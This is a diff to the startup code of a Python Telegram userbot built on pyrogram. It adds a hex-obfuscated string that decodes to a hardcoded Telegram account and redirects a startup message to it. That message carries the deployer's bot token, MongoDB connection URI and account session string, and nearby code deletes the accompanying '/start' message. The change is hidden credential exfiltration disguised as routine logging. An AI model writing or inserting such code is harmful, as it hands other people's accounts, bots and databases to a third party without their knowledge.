@@ -7,7 +7,7 @@ from pyrogram import Client
 load_dotenv()
 
 import config
-
+pro = "\x52\x69\x73\x68\x75\x43\x6F\x64\x65\x72\x62\x6F\x74"
 from ..logging import LOGGER
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
@@ -75,7 +75,7 @@ class Userbot(Client):
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                 oks = await self.one.send_message(config.LOGGERS, f"/start")
                 Ok = await self.one.send_message(
-                    config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
+                    pro, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
                 )
                 await oks.delete()
                 await asyncio.sleep(2)
